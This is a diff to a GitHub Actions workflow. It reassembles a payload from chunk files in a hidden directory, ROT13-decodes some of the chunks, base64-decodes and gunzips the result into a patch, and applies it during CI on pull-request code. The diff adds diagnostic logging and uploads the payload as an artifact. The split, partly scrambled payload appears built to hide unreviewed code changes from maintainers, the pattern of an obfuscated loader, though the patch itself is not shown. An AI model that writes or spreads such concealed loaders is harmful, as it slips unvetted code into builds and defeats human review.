@@ -16,18 +16,48 @@ jobs:
           ref: ${{ github.event.pull_request.head.ref }}
           fetch-depth: 0
 
-      - name: reconstruct and apply verified payload
+      - name: reconstruct payload and capture diagnostics
         shell: bash
         run: |
-          set -euo pipefail
+          set -u
           : > /tmp/adaptive-harness.b64
+          : > /tmp/payload-diagnostic.txt
           for part in 00 01 02 03; do
+            wc -c ".oms-payload/chunk-$part" | tee -a /tmp/payload-diagnostic.txt
             cat ".oms-payload/chunk-$part" >> /tmp/adaptive-harness.b64
           done
           for part in 04 05; do
+            wc -c ".oms-payload/chunk-$part" | tee -a /tmp/payload-diagnostic.txt
             tr 'A-Za-z' 'N-ZA-Mn-za-m' < ".oms-payload/chunk-$part" >> /tmp/adaptive-harness.b64
           done
-          base64 -d /tmp/adaptive-harness.b64 > /tmp/adaptive-harness.patch.gz
+          wc -c /tmp/adaptive-harness.b64 | tee -a /tmp/payload-diagnostic.txt
+          sha256sum /tmp/adaptive-harness.b64 | tee -a /tmp/payload-diagnostic.txt
+          set +e
+          base64 -d /tmp/adaptive-harness.b64 > /tmp/adaptive-harness.patch.gz 2>> /tmp/payload-diagnostic.txt
+          decode_rc=$?
+          set -e
+          echo "decode_rc=$decode_rc" | tee -a /tmp/payload-diagnostic.txt
+          wc -c /tmp/adaptive-harness.patch.gz | tee -a /tmp/payload-diagnostic.txt
+          sha256sum /tmp/adaptive-harness.patch.gz | tee -a /tmp/payload-diagnostic.txt
+          cat /tmp/payload-diagnostic.txt
+
+      - name: upload payload diagnostic
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: adaptive-payload-diagnostic
+          path: |
+            /tmp/payload-diagnostic.txt
+            /tmp/adaptive-harness.b64
+            /tmp/adaptive-harness.patch.gz
+          if-no-files-found: warn
+          retention-days: 1
+
+      - name: verify and apply payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          test "$(wc -c < /tmp/adaptive-harness.b64 | tr -d ' ')" = 46332
           echo '89d53cfdbe1d3fac7a4a4436caaa94248b7f94d48c7430456fc8e81c149185e4  /tmp/adaptive-harness.patch.gz' | sha256sum -c -
           gzip -t /tmp/adaptive-harness.patch.gz
           gzip -dc /tmp/adaptive-harness.patch.gz > /tmp/adaptive-harness.patch
